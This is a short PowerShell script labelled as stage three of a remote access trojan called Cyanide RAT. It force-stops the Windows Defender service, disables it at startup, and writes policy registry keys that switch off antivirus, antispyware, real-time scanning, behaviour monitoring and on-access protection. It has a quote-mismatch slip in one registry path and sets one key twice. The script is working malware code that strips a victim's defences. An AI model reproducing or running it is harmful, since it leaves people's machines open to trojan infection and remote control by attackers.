#Stage 3 for Cyanide RAT
#Created by: JaxHax
#Version: 1.1


try {
    Get-Service WinDefend | Stop-Service -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -Value 4 -Type DWord -Force
} catch {
    Write-Warning "Unable to disable Windows Defender"
}

try {
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft' -Name 'Windows Defender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWord -Force -ea 0 | Out-Null
} catch {
    Write-Warning "Unable to disable Windows Defender"
}